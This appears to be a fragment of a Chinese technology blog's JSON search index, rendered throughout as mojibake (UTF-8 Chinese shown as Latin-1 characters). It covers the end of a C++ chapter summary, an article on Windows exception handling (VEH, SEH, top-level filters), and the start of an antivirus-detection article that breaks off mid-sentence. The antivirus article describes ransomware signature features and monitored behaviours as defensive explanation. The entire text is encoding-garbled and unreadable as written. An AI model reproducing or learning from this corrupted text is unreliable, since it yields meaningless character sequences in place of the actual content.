è¯»å–å­—ç¬¦ä¸²è¾“å…¥ï¼Œå¹¶ç‰¹åˆ«æ³¨æ„äº†æ··åˆè¾“å…¥æ•°å­—å’Œæ•´è¡Œå­—ç¬¦ä¸²æ—¶å¯èƒ½é‡åˆ°çš„é—®é¢˜ã€‚ ç¬¬äºŒç§ï¼Œä¹Ÿæ˜¯C++ä¸­æ›´æ¨èçš„æ–¹å¼ï¼Œæ˜¯ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„ string ç±»ã€‚string ç±»æä¾›äº†è‡ªåŠ¨å†…å­˜ç®¡ç†ã€æ–¹ä¾¿çš„èµ‹å€¼ã€æ‹¼æ¥ (+) å’Œé™„åŠ  (+=) æ“ä½œï¼Œä»¥åŠå¤§é‡ç”¨äºæŸ¥æ‰¾ã€ä¿®æ”¹ã€æ¯”è¾ƒå’Œè®¿é—®å­—ç¬¦çš„æˆå‘˜å‡½æ•°ã€‚æˆ‘ä»¬è¿˜å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ cin, cout, å’Œ getline å¯¹ string å¯¹è±¡è¿›è¡Œè¾“å…¥è¾“å‡ºï¼Œå¹¶äº†è§£äº†C++11å¼•å…¥çš„åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼å’ŒUnicodeå­—ç¬¦ä¸²å­—é¢å€¼ã€‚ ç»“æ„ (Structure) è¢«å¼•å…¥ä½œä¸ºä¸€ç§åˆ›å»ºè‡ªå®šä¹‰å¤åˆç±»å‹çš„æ–¹å¼ï¼Œå…è®¸å°†ä¸åŒç±»å‹çš„æ•°æ®é¡¹ï¼ˆæˆå‘˜ï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰ç»“æ„ã€å£°æ˜ç»“æ„å˜é‡ã€ä½¿ç”¨ç‚¹è¿ç®—ç¬¦ (.) è®¿é—®æˆå‘˜ï¼Œä»¥åŠC++11çš„åˆ—è¡¨åˆå§‹åŒ–ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°ç»“æ„ä½“å¯ä»¥åŒ…å« string å¯¹è±¡æˆ–æ•°ç»„ä½œä¸ºæˆå‘˜ï¼Œç»“æ„å˜é‡å¯ä»¥ç›¸äº’èµ‹å€¼ï¼Œå¯ä»¥ä½œä¸ºå‡½æ•°å‚æ•°ï¼ˆæŒ‰å€¼ã€æŒ‰å¼•ç”¨ã€æŒ‰æŒ‡é’ˆï¼‰å’Œè¿”å›å€¼ã€‚ç»“æ„æ•°ç»„å…è®¸æˆ‘ä»¬ç®¡ç†ä¸€ç»„ç»“æ„å¯¹è±¡ï¼Œè€Œä½å­—æ®µåˆ™æä¾›äº†ä¸€ç§åœ¨ç»“æ„å†…ç²¾ç¡®æ§åˆ¶æˆå‘˜å ç”¨ä½æ•°çš„æ–¹å¼ã€‚ å…±ç”¨ä½“ (Union) ä½œä¸ºå¦ä¸€ç§å¤åˆç±»å‹è¢«ä»‹ç»ï¼Œå…¶ç‰¹ç‚¹æ˜¯æ‰€æœ‰æˆå‘˜å…±äº«åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸»è¦ç”¨äºèŠ‚çœå†…å­˜æˆ–è¿›è¡Œç±»å‹åŒå…³ï¼ˆéœ€è°¨æ…ï¼‰ã€‚æˆ‘ä»¬äº†è§£äº†å¦‚ä½•å®šä¹‰å’Œè®¿é—®å…±ç”¨ä½“ï¼Œä»¥åŠä½¿ç”¨åŒ¿åå…±ç”¨ä½“ã€‚ æšä¸¾ (Enum) æä¾›äº†ä¸€ç§åˆ›å»ºå…·åæ•´æ•°å¸¸é‡çš„æ–¹å¼ï¼Œæé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œç±»å‹å®‰å…¨ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰æšä¸¾ã€æ˜¾å¼è®¾ç½®æšä¸¾é‡çš„å€¼ã€æšä¸¾çš„å–å€¼èŒƒå›´ï¼Œå¹¶ç®€è¦ä»‹ç»äº†C++11å¼•å…¥çš„æ›´å®‰å…¨çš„**ä½œç”¨åŸŸå†…æšä¸¾ (enum class)**ã€‚ æœ¬ç« çš„ä¸€ä¸ªæ ¸å¿ƒå†…å®¹æ˜¯æŒ‡é’ˆ (Pointer) å’Œ**è‡ªç”±å­˜å‚¨ç©ºé—´ (Free Store / Heap)**ã€‚æŒ‡é’ˆæ˜¯å­˜å‚¨å†…å­˜åœ°å€çš„å˜é‡ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆï¼ˆåŒ…æ‹¬ä½¿ç”¨ &amp; è·å–åœ°å€å’Œåˆå§‹åŒ–ä¸º nullptrï¼‰ï¼Œå¦‚ä½•ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦ * è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼ï¼Œå¹¶å¼ºè°ƒäº†ä½¿ç”¨æœªåˆå§‹åŒ–æŒ‡é’ˆã€ç©ºæŒ‡é’ˆæˆ–æ‚¬æŒ‚æŒ‡é’ˆçš„å±é™©ã€‚ æˆ‘ä»¬å­¦ä¹ äº†ä½¿ç”¨ new è¿ç®—ç¬¦åœ¨è‡ªç”±å­˜å‚¨åŒºåŠ¨æ€åˆ†é…å†…å­˜ï¼ˆç”¨äºå•ä¸ªå˜é‡æˆ–å¯¹è±¡ï¼‰ï¼Œä»¥åŠä½¿ç”¨ delete è¿ç®—ç¬¦é‡Šæ”¾è¿™äº›å†…å­˜ã€‚åŒæ ·ï¼Œæˆ‘ä»¬å­¦ä¹ äº†ä½¿ç”¨ new[] åŠ¨æ€åˆ†é…æ•°ç»„ï¼Œå¹¶å¼ºè°ƒå¿…é¡»ä½¿ç”¨ delete[] æ¥é‡Šæ”¾åŠ¨æ€æ•°ç»„å†…å­˜ã€‚æ­£ç¡®é…å¯¹ new/delete å’Œ new[]/delete[] å¯¹äºé¿å…å†…å­˜æ³„æ¼å’Œç¨‹åºå´©æºƒè‡³å…³é‡è¦ã€‚ æŒ‡é’ˆä¸æ•°ç»„çš„ç´§å¯†å…³ç³»ä»¥åŠæŒ‡é’ˆç®—æœ¯ä¹Ÿè¢«è¯¦ç»†è®¨è®ºã€‚æ•°ç»„åé€šå¸¸å¯è§†ä¸ºæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆç®—æœ¯å…è®¸åœ¨æ•°ç»„å…ƒç´ é—´ç§»åŠ¨ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆå¤„ç†Cé£æ ¼å­—ç¬¦ä¸²ï¼Œä»¥åŠå¦‚ä½•åŠ¨æ€åˆ›å»ºç»“æ„å¹¶ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ (-&gt;) é€šè¿‡æŒ‡é’ˆè®¿é—®å…¶æˆå‘˜ã€‚æœ€åï¼Œæˆ‘ä»¬åŒºåˆ†äº†ä¸‰ç§ä¸»è¦çš„å­˜å‚¨æŒç»­æ€§ï¼šè‡ªåŠ¨å­˜å‚¨ï¼ˆæ ˆï¼‰ã€é™æ€å­˜å‚¨å’ŒåŠ¨æ€å­˜å‚¨ï¼ˆå †ï¼‰ã€‚ æˆ‘ä»¬è¿˜æ¢è®¨äº†å¦‚ä½•ç»„åˆè¿™äº›ç±»å‹ï¼Œä¾‹å¦‚åˆ›å»ºåŒ…å«æ•°ç»„æˆ–æŒ‡é’ˆæˆå‘˜çš„ç»“æ„ã€æŒ‡é’ˆæ•°ç»„ä»¥åŠæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆï¼Œä»¥æ„å»ºæ›´å¤æ‚çš„æ•°æ®è¡¨ç¤ºã€‚ æœ€åï¼Œæˆ‘ä»¬ä»‹ç»äº†C++æ ‡å‡†åº“æä¾›çš„å†…ç½®æ•°ç»„çš„ç°ä»£æ›¿ä»£å“ï¼š**std::vector**ï¼ˆåŠ¨æ€å¤§å°æ•°ç»„ï¼‰å’Œ **std::array**ï¼ˆå›ºå®šå¤§å°æ•°ç»„ï¼ŒC++11ï¼‰ã€‚å®ƒä»¬æä¾›äº†æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ¥å£å’Œè‡ªåŠ¨å†…å­˜ç®¡ç†ï¼ˆå¯¹äº vectorï¼‰ï¼Œæ˜¯ç°ä»£C++ç¼–ç¨‹ä¸­æ¨èçš„é€‰æ‹©ã€‚ é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº†åˆ›å»ºå’Œä½¿ç”¨å„ç§å¤åˆæ•°æ®ç±»å‹ä»¥åŠè¿›è¡ŒåŠ¨æ€å†…å­˜ç®¡ç†çš„åŸºæœ¬æŠ€èƒ½ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Windowså¼‚å¸¸å¤„ç†æœºåˆ¶æ·±åº¦è§£æ","slug":"windows_exception","date":"2025-03-31T15:49:59.201Z","updated":"2025-03-31T16:19:42.614Z","comments":true,"path":"2025/03/31/windows_exception/","link":"","permalink":"http://uniqueland.top/2025/03/31/windows_exception/","excerpt":"","text":"ä»€ä¹ˆæ˜¯Windowså¼‚å¸¸Windowså¼‚å¸¸æ˜¯æŒ‡åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„éæ­£å¸¸æƒ…å†µï¼Œè¿™äº›æƒ…å†µä¼šä¸­æ–­ç¨‹åºæ­£å¸¸çš„æ‰§è¡Œæµç¨‹ã€‚Windowsæ“ä½œç³»ç»Ÿæä¾›äº†å®Œå–„çš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ¥åº”å¯¹è¿™äº›æƒ…å†µï¼Œä½¿ç¨‹åºèƒ½å¤Ÿä¼˜é›…åœ°å¤„ç†é”™è¯¯å¹¶å°½å¯èƒ½æ¢å¤æ­£å¸¸è¿è¡Œã€‚ ä»æœ¬è´¨ä¸Šçœ‹ï¼ŒWindowså¼‚å¸¸å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼šç¡¬ä»¶å¼‚å¸¸å’Œè½¯ä»¶å¼‚å¸¸ã€‚ç¡¬ä»¶å¼‚å¸¸ç”±CPUç›´æ¥äº§ç”Ÿï¼Œå¦‚å†…å­˜è®¿é—®è¿è§„ã€é™¤é›¶é”™è¯¯ç­‰ï¼›è€Œè½¯ä»¶å¼‚å¸¸åˆ™æ˜¯ç”±ç¨‹åºä»£ç ä¸»åŠ¨è§¦å‘ï¼Œå¦‚C++çš„throwè¯­å¥ã€Windows APIä¸­çš„RaiseExceptionå‡½æ•°ç­‰ã€‚ å¸¸è§çš„å¼‚å¸¸è§¦å‘æƒ…å†µåŠç°è±¡åœ¨æ—¥å¸¸ç¼–ç¨‹å’Œç³»ç»Ÿä½¿ç”¨ä¸­ï¼Œå¼‚å¸¸å¯èƒ½ç”±å¤šç§æƒ…å†µè§¦å‘ã€‚å†…å­˜è®¿é—®è¿è§„æ˜¯ä¸€ç§å¸¸è§æƒ…å†µï¼ŒåŒ…æ‹¬è®¿é—®ç©ºæŒ‡é’ˆï¼ˆ0x00000000ï¼‰ã€è®¿é—®å·²é‡Šæ”¾çš„å†…å­˜æˆ–å°è¯•å†™å…¥åªè¯»å†…å­˜åŒºåŸŸã€‚è®¡ç®—å¼‚å¸¸ä¹Ÿæ—¶æœ‰å‘ç”Ÿï¼Œå¦‚é™¤é›¶æ“ä½œã€æ•´æ•°æº¢å‡ºæˆ–æµ®ç‚¹è¿ç®—é”™è¯¯ã€‚éæ³•æŒ‡ä»¤å¼‚å¸¸åˆ™å¯èƒ½æºäºæ‰§è¡Œæ— æ•ˆæˆ–ç‰¹æƒæŒ‡ä»¤ï¼Œæˆ–æ˜¯é”™è¯¯åœ°æ‰§è¡Œæ•°æ®åŒºåŸŸçš„å†…å®¹ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ç¨‹åºé€šè¿‡RaiseException APIã€C++çš„throwè¯­å¥æˆ–.NETä¸­çš„throwæŒ‡ä»¤ä¸»åŠ¨æŠ›å‡ºçš„å¼‚å¸¸ã€‚ è¿™äº›å¼‚å¸¸è§¦å‘æ—¶ï¼Œç”¨æˆ·å¯èƒ½ä¼šçœ‹åˆ°ä¸åŒçš„ç°è±¡ï¼šåº”ç”¨ç¨‹åºå´©æºƒå¹¶æ˜¾ç¤ºâ€XXXå·²åœæ­¢å·¥ä½œâ€çš„å¯¹è¯æ¡†ï¼›Windowsé”™è¯¯æŠ¥å‘Šå·¥å…·å¼¹å‡ºï¼›ç¨‹åºæ— é¢„è­¦åœ°ç»ˆæ­¢è¿è¡Œï¼›åœ¨è°ƒè¯•ç¯å¢ƒä¸­è§¦å‘æ–­ç‚¹ï¼›ç”šè‡³åœ¨ä¸¥é‡çš„å†…æ ¸æ¨¡å¼å¼‚å¸¸æƒ…å†µä¸‹å¯¼è‡´ç³»ç»Ÿè“å±ã€‚è¿™äº›ç°è±¡éƒ½æ˜¯Windowså¼‚å¸¸å¤„ç†æœºåˆ¶å·¥ä½œçš„å¤–åœ¨è¡¨ç°ã€‚ Windowså¼‚å¸¸å¤„ç†æµç¨‹å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒWindowsä¼šæŒ‰ç…§ä¸€ä¸ªä¸¥æ ¼çš„é¡ºåºå°è¯•å¤„ç†å¼‚å¸¸ã€‚é¦–å…ˆæ˜¯å¼‚å¸¸çš„è§¦å‘ï¼ŒCPUæ£€æµ‹åˆ°å¼‚å¸¸æ¡ä»¶å¹¶ç”Ÿæˆä¸­æ–­ã€‚å¦‚æœç¨‹åºåœ¨è°ƒè¯•å™¨ä¸‹è¿è¡Œï¼Œè°ƒè¯•å™¨æ‹¥æœ‰ç¬¬ä¸€ä¼˜å…ˆæƒæ¥å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œè¿™ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿåœ¨å¼‚å¸¸å‘ç”Ÿçš„ç¬¬ä¸€æ—¶é—´åˆ†æé—®é¢˜ã€‚ è‹¥æ— è°ƒè¯•å™¨æˆ–è°ƒè¯•å™¨é€‰æ‹©ä¸å¤„ç†ï¼Œç³»ç»Ÿä¼šè°ƒç”¨å·²æ³¨å†Œçš„å‘é‡åŒ–å¼‚å¸¸å¤„ç†å‡½æ•°ï¼ˆVectored Exception Handlersï¼ŒVEHï¼‰ã€‚æ¥ä¸‹æ¥ï¼Œå¦‚æœå¼‚å¸¸ä»æœªè¢«å¤„ç†ï¼Œç³»ç»Ÿä¼šéå†å½“å‰çº¿ç¨‹çš„ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆStructured Exception Handlingï¼ŒSEHï¼‰é“¾ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿå¤„ç†è¯¥å¼‚å¸¸çš„å¤„ç†å™¨ã€‚ å½“SEHé“¾ä¸­æ²¡æœ‰åˆé€‚çš„å¤„ç†å™¨æ—¶ï¼Œç³»ç»Ÿä¼šè°ƒç”¨é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆUnhandledExceptionFilterå‡½æ•°ï¼‰ä½œä¸ºæœ€åçš„åº”ç”¨ç¨‹åºçº§é˜²çº¿ã€‚å¦‚æœæ‰€æœ‰è¿™äº›æœºåˆ¶éƒ½æ— æ³•å¤„ç†å¼‚å¸¸ï¼Œç³»ç»Ÿå°†æ¥ç®¡å¹¶æ‰§è¡Œé»˜è®¤å¤„ç†ï¼šæ˜¾ç¤ºé”™è¯¯å¯¹è¯æ¡†å¹¶ç»ˆæ­¢è¿›ç¨‹ã€‚è¿™ç§å±‚å±‚é€’è¿›çš„è®¾è®¡ç¡®ä¿äº†å¼‚å¸¸èƒ½å¤Ÿåœ¨æœ€é€‚å½“çš„å±‚æ¬¡è¢«å¤„ç†ï¼ŒåŒæ—¶æä¾›äº†å¤šé‡ä¿éšœæœºåˆ¶ã€‚ å³ï¼šå¼‚å¸¸è§¦å‘ -- è°ƒè¯•å™¨ï¼ˆè‹¥å­˜åœ¨ï¼‰ -- å·²æ³¨å†Œçš„VEHå¤„ç†å‡½æ•°ï¼ˆå½±å“æ•´ä¸ªè¿›ç¨‹ï¼‰ -- éå†çº¿ç¨‹çš„SEHé“¾ï¼ˆå½±å“å•ä¸ªçº¿ç¨‹ï¼‰ -- é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆå…œåº•ï¼‰ -- ç³»ç»Ÿé»˜è®¤å¤„ç† å¼‚å¸¸å¤„ç†å„ç¯èŠ‚çš„ä½œç”¨åŠåŒºåˆ«è°ƒè¯•å™¨å¤„ç†æ˜¯å¼‚å¸¸å¤„ç†æµç¨‹çš„ç¬¬ä¸€å…³å¡ã€‚è°ƒè¯•å™¨æ‹¥æœ‰å¤„ç†å¼‚å¸¸çš„æœ€é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥åœ¨å¼‚å¸¸å‘ç”Ÿçš„ç¬¬ä¸€æ—¶é—´æ•è·å¹¶æš‚åœç¨‹åºæ‰§è¡Œã€‚è¿™ä¸€ç¯èŠ‚çš„ç‹¬ç‰¹ä¹‹å¤„åœ¨äºå®ƒèƒ½å¤Ÿå±•ç¤ºå¼‚å¸¸å‘ç”Ÿæ—¶çš„å®Œæ•´ä¸Šä¸‹æ–‡ï¼Œå…è®¸å¼€å‘è€…ä¿®æ”¹ç¨‹åºçŠ¶æ€åç»§ç»­æ‰§è¡Œã€‚å¼‚å¸¸åœ¨è°ƒè¯•å™¨ä¸­åˆ†ä¸ºä¸€æ¬¡æœºä¼šå’ŒäºŒæ¬¡æœºä¼šå¼‚å¸¸ï¼Œä¸ºè°ƒè¯•æä¾›äº†çµæ´»æ€§ã€‚ å‘é‡åŒ–å¼‚å¸¸å¤„ç†ï¼ˆVEHï¼‰æä¾›äº†ä¸€ç§å…¨å±€æ€§çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå…¶æœ€å¤§ç‰¹ç‚¹æ˜¯ä¸å—å‡½æ•°è°ƒç”¨å †æ ˆçš„é™åˆ¶ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡AddVectoredExceptionHandler APIæ³¨å†Œå¤„ç†å‡½æ•°ï¼Œç³»ç»Ÿä¼šæŒ‰æ³¨å†Œé¡ºåºæˆ–ååºè°ƒç”¨æ‰€æœ‰å¤„ç†å‡½æ•°ã€‚VEHç‰¹åˆ«é€‚åˆå…¨å±€é”™è¯¯ç›‘æ§ã€æ—¥å¿—è®°å½•ç­‰åœºæ™¯ï¼Œä¸”ä¸éœ€è¦åœ¨ä»£ç ä¸­æ·»åŠ ç‰¹æ®Šçš„è¯­è¨€ç»“æ„ï¼ˆå¦‚try/exceptï¼‰ã€‚ ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ˜¯Windowsä¼ ç»Ÿçš„æ ¸å¿ƒå¼‚å¸¸å¤„ç†æ–¹å¼ï¼Œæä¾›äº†åŸºäºè°ƒç”¨æ ˆçš„å¼‚å¸¸ä¿æŠ¤æœºåˆ¶ã€‚å®ƒé€šè¿‡__try/__except/__finallyå—å®ç°ï¼Œé‡‡ç”¨é“¾è¡¨ç»“æ„å¹¶ä¸å‡½æ•°è°ƒç”¨å †æ ˆç´§å¯†å…³è”ã€‚SEHéµå¾ªâ€å…ˆæ³¨å†Œåä½¿ç”¨â€çš„LIFOåŸåˆ™ï¼Œè¿™æ„å‘³ç€æœ€è¿‘è®¾ç½®çš„å¼‚å¸¸å¤„ç†å™¨ä¼šé¦–å…ˆè¢«è°ƒç”¨ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒC++å¼‚å¸¸å¤„ç†æœºåˆ¶åœ¨Windowså¹³å°çš„åº•å±‚å®ç°ä¹Ÿæ˜¯åŸºäºSEHçš„ã€‚ é¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ä½œä¸ºåº”ç”¨ç¨‹åºçº§åˆ«çš„æœ€åé˜²çº¿ï¼Œè´Ÿè´£å¤„ç†æ‰€æœ‰æœªè¢«æ•è·çš„å¼‚å¸¸ã€‚é€šè¿‡SetUnhandledExceptionFilter APIï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥è®¾ç½®ä¸€ä¸ªé¡¶å±‚å¼‚å¸¸è¿‡æ»¤å™¨ã€‚è¿™ä¸€æœºåˆ¶å¸¸ç”¨äºå®ç°å´©æºƒè½¬å‚¨åŠŸèƒ½ï¼Œæ˜¯æ„å»ºè‡ªå®šä¹‰åº”ç”¨ç¨‹åºé”™è¯¯æŠ¥å‘Šç³»ç»Ÿçš„ç†æƒ³é€‰æ‹©ã€‚ å½“æ‰€æœ‰ç”¨æˆ·å®šä¹‰çš„å¼‚å¸¸å¤„ç†å™¨éƒ½æ— æ³•å¤„ç†å¼‚å¸¸æ—¶ï¼Œæ“ä½œç³»ç»Ÿçš„é»˜è®¤å¤„ç†æœºåˆ¶æ¥ç®¡ã€‚ç³»ç»Ÿä¼šæ˜¾ç¤ºåº”ç”¨ç¨‹åºé”™è¯¯å¯¹è¯æ¡†ï¼Œå¯èƒ½ç”Ÿæˆé”™è¯¯æŠ¥å‘Šå‘é€åˆ°Microsoftï¼Œå¹¶ç»ˆæ­¢å‘ç”Ÿå¼‚å¸¸çš„è¿›ç¨‹ï¼Œé‡Šæ”¾å…¶å ç”¨çš„èµ„æºã€‚è¿™æ˜¯ä¿è¯ç³»ç»Ÿç¨³å®šæ€§çš„æœ€åä¸€é“é˜²çº¿ã€‚ é€šè¿‡è¿™ç§åˆ†å±‚çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼ŒWindowsæä¾›äº†å¼ºå¤§è€Œçµæ´»çš„é”™è¯¯å¤„ç†èƒ½åŠ›ï¼Œæ—¢é€‚åˆå¼€å‘äººå‘˜è¿›è¡Œè°ƒè¯•ï¼Œä¹Ÿèƒ½ä¸ºæœ€ç»ˆç”¨æˆ·æä¾›è¾ƒå¥½çš„é”™è¯¯æ¢å¤ä½“éªŒã€‚å¯¹äºå®‰å…¨ç ”ç©¶äººå‘˜æ¥è¯´ï¼Œæ·±å…¥ç†è§£è¿™å¥—æœºåˆ¶å¯¹äºæ¼æ´åˆ†æå’Œåˆ©ç”¨åŒæ ·å…·æœ‰é‡è¦æ„ä¹‰ã€‚","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://uniqueland.top/tags/Windows/"}]},{"title":"ç—…æ¯’æ‰«æèƒŒåçš„ç§˜å¯†ï¼šä»ç‰¹å¾ç åˆ°æ™ºèƒ½é˜²å¾¡çš„æŠ€æœ¯æ­ç§˜","slug":"virus_defence","date":"2025-03-31T14:00:59.126Z","updated":"2025-03-31T14:27:37.497Z","comments":true,"path":"2025/03/31/virus_defence/","link":"","permalink":"http://uniqueland.top/2025/03/31/virus_defence/","excerpt":"","text":"åœ¨æ•°å­—ä¸–ç•Œä¸­ï¼Œç—…æ¯’ä¸æ€æ¯’è½¯ä»¶çš„å¯¹æŠ—ä»æœªåœæ­‡ã€‚è¦å®ç°ç²¾å‡†çš„ç—…æ¯’æŸ¥æ€ï¼Œæ ¸å¿ƒä¾èµ–äºä¸‰å¤§æŠ€æœ¯ï¼šç—…æ¯’ç‰¹å¾ç è¯†åˆ«ã€è¡Œä¸ºç›‘æ§ä»¥åŠå¯å‘å¼åˆ†æã€‚æœ¬æ–‡å°†è§£æè¿™äº›æŠ€æœ¯çš„åŸç†ä¸å®ç°æ–¹å¼ï¼Œæ­å¼€ç—…æ¯’æ‰«æèƒŒåçš„åŸç†ã€‚ ç—…æ¯’æ‰«æçš„æ ¸å¿ƒï¼šç‰¹å¾ç æ£€æµ‹ç‰¹å¾ç æ£€æµ‹çš„å®ç°è¿‡ç¨‹ç—…æ¯’ç‰¹å¾ç æ˜¯ä»ç—…æ¯’æ ·æœ¬ä¸­æå–çš„ç‹¬ç‰¹äºŒè¿›åˆ¶ä»£ç ç‰‡æ®µï¼Œé€šå¸¸ä¸è¶…è¿‡64å­—èŠ‚ï¼Œå¯è§†ä¸ºç—…æ¯’çš„â€œæ•°å­—æŒ‡çº¹â€ã€‚ç‰¹å¾ç æ£€æµ‹çš„å®ç°éœ€è¦ç»è¿‡ä»¥ä¸‹æŠ€æœ¯æµç¨‹ï¼š æ ·æœ¬é‡‡é›†ä¸é¢„å¤„ç†é€šè¿‡æ²™ç®±æ•è·ã€ç”¨æˆ·ä¸ŠæŠ¥æˆ–èœœç½ç³»ç»Ÿæ”¶é›†ç—…æ¯’æ ·æœ¬ã€‚ä¾‹å¦‚ï¼Œå®‰å…¨å‚å•†VirusTotalæ¯å¤©æ¥æ”¶è¶…è¿‡100ä¸‡ä»½å¯ç–‘æ–‡ä»¶ï¼Œç»äººå·¥åˆ†æåæå–æœ‰æ•ˆç‰¹å¾ç ã€‚æ ·æœ¬éœ€ç»è¿‡è„±å£³ï¼ˆå¦‚UPXã€ASPackç­‰å¸¸è§å£³ï¼‰ã€è§£å¯†ç­‰é¢„å¤„ç†ï¼Œä»¥è·å–ç—…æ¯’åŸå§‹ä»£ç ã€‚ ä»£ç é€†å‘ä¸ç‰¹å¾å®šä½ä½¿ç”¨é€†å‘å·¥å…·ï¼ˆå¦‚IDA Proã€Ghidraï¼‰åˆ†æç—…æ¯’äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®šä½æ ¸å¿ƒåŠŸèƒ½æ¨¡å—ï¼ˆå¦‚æ„ŸæŸ“æ¨¡å—ã€åŠ å¯†å‡½æ•°ï¼‰ã€‚ä¾‹å¦‚ï¼ŒWannaCryç—…æ¯’çš„MS17-010æ¼æ´åˆ©ç”¨ä»£ç æ®µä¼šè¢«æ ‡è®°ä¸ºå…³é”®ç‰¹å¾ã€‚ä¸ºç¡®ä¿ç‰¹å¾ç ç¨³å®šæ€§ï¼Œé€šå¸¸ä¼šé€‰æ‹©ä»£ç æ®µï¼ˆ.textèŠ‚ï¼‰è€Œéæ•°æ®æ®µï¼ˆ.dataèŠ‚ï¼‰ï¼Œé¿å…ç—…æ¯’å˜ç§ä¿®æ”¹æ•°æ®å¯¼è‡´å¤±æ•ˆã€‚ å¤åˆç‰¹å¾ç ç”Ÿæˆå¯¹å¤šæ€ç—…æ¯’ï¼ˆå¦‚Emotetï¼‰ï¼Œéœ€æå–å¤šæ®µç‰¹å¾ç å½¢æˆé€»è¾‘ç»„åˆã€‚ä¾‹å¦‚ï¼ŒæŸå‹’ç´¢ç—…æ¯’çš„ç‰¹å¾ç å¯èƒ½åŒ…æ‹¬ï¼š å­—ç¬¦ä¸²ç‰¹å¾ï¼š&quot;This file is encrypted by [å®¶æ—å]&quot;ï¼› ä»£ç ç‰¹å¾ï¼šç‰¹å®šAPIè°ƒç”¨åºåˆ—ï¼ˆå¦‚CryptEncryptâ†’DeleteFileï¼‰ï¼› å“ˆå¸Œç‰¹å¾ï¼šåŠ å¯†å‡½æ•°æ‰€åœ¨ä»£ç èŠ‚çš„SHA-256å€¼ã€‚ ç‰¹å¾ç ä¼˜åŒ–ä¸éªŒè¯ä½¿ç”¨å·¥å…·ï¼ˆå¦‚MyCCLï¼‰è¿›è¡Œå†²çªæµ‹è¯•ï¼šå°†ç‰¹å¾ç æ’å…¥æ­£å¸¸æ–‡ä»¶ï¼ŒéªŒè¯æ˜¯å¦è§¦å‘è¯¯æŠ¥ã€‚é€šè¿‡æ¨¡ç³Šå“ˆå¸Œï¼ˆssdeepï¼‰æŠ€æœ¯é™ä½ç‰¹å¾ç å¯¹å¾®å°ä¿®æ”¹çš„æ•æ„Ÿåº¦ï¼Œæå‡å¯¹æŠ—å˜ç§ç—…æ¯’çš„èƒ½åŠ›ã€‚ è¡Œä¸ºç›‘æ§ï¼šå®æ—¶é˜²å¾¡çš„â€œåŠ¨æ€å“¨å…µâ€è¡Œä¸ºç›‘æ§çš„æŠ€æœ¯åŸç†è¡Œä¸ºç›‘æ§ä¸ä¾èµ–é™æ€ç‰¹å¾ç ï¼Œè€Œæ˜¯é€šè¿‡é’©å­ï¼ˆHookï¼‰æŠ€æœ¯å®æ—¶ç›‘æ§ç¨‹åºè¡Œä¸ºï¼Œä¸»è¦å…³æ³¨ä»¥ä¸‹é«˜å±æ“ä½œï¼š æ–‡ä»¶æ“ä½œï¼šçŸ­æ—¶é—´å†…åŠ å¯†å¤§é‡æ–‡ä»¶ï¼ˆå¦‚å‹’ç´¢ç—…æ¯’è¡Œä¸ºï¼‰ï¼› è¿›ç¨‹æ³¨å…¥ï¼šå°†ä»£ç å†™å…¥å…¶ä»–è¿›ç¨‹å†…å­˜ï¼ˆå¦‚DLLæ³¨å…¥ï¼‰ï¼› æ³¨å†Œè¡¨ç¯¡æ”¹ï¼šä¿®æ”¹ç³»ç»Ÿå¯åŠ¨é¡¹æˆ–æœåŠ¡é…ç½®ï¼› ç½‘ç»œè¡Œä¸ºï¼šå¼‚å¸¸ç«¯å£æ‰«ææˆ–C2æœåŠ¡å™¨é€šä¿¡ã€‚ å®ç°æµç¨‹ç¤ºä¾‹ï¼ˆä»¥å‹’ç´¢ç—…æ¯’æ£€æµ‹ä¸ºä¾‹ï¼‰ APIç›‘æ§å±‚é€šè¿‡å†…æ ¸çº§é’©å­ï¼ˆå¦‚Windowsçš„SSDT 